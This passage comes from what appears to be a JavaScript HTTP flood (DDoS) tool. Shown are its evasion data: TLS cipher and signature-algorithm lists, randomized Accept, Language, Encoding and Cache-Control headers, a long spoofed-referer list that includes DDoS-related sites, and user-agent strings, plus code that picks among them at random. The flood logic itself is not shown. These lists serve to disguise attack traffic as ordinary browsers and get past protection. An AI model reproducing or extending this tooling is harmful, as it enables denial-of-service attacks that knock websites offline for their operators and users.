 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
];

const hihi = [ "require-corp", "unsafe-none", ];

const sigalgs = [
 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
 'ecdsa_brainpoolP256r1tls13_sha256',
 'ecdsa_brainpoolP384r1tls13_sha384',
 'ecdsa_brainpoolP512r1tls13_sha512',
 'ecdsa_sha1',
 'ed25519',
 'ed448',
 'ecdsa_sha224',
 'rsa_pkcs1_sha1',
 'rsa_pss_pss_sha256',
 'dsa_sha256',
 'dsa_sha384',
 'dsa_sha512',
 'dsa_sha224',
 'dsa_sha1',
 'rsa_pss_pss_sha384',
 'rsa_pkcs1_sha2240',
 'rsa_pss_pss_sha512',
 'sm2sig_sm3',
 'ecdsa_secp521r1_sha512',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    
]

accept_header = [
  'application/json',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
],

encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, lzma, sdch',
  'deflate',
  'gzip, deflate, br'
];

controle_header = [
  'no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400',
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'
];

const Methods = [
  "GET",
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

// Define missing variables used in headers
const HTTPS = "https";
const trailers = "trailers";
const websocket = "websocket";

const queryStrings = [
  "&", 
  "=", 
];

const pathts = [
  "/",
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
];

const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',

  ];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
  "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
  "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
  "portalmmm/2.0 N410i(c20;TB) ",
  "Python-urllib/2.5",
  "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
  "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
  "SearchExpress",
  "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
  "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
  "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
  "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonT100/R101",
  "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
  "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
  "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
  "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
  "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
  "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
  "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
  "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonT68/R201A",
  "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
  "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
  "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
  "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
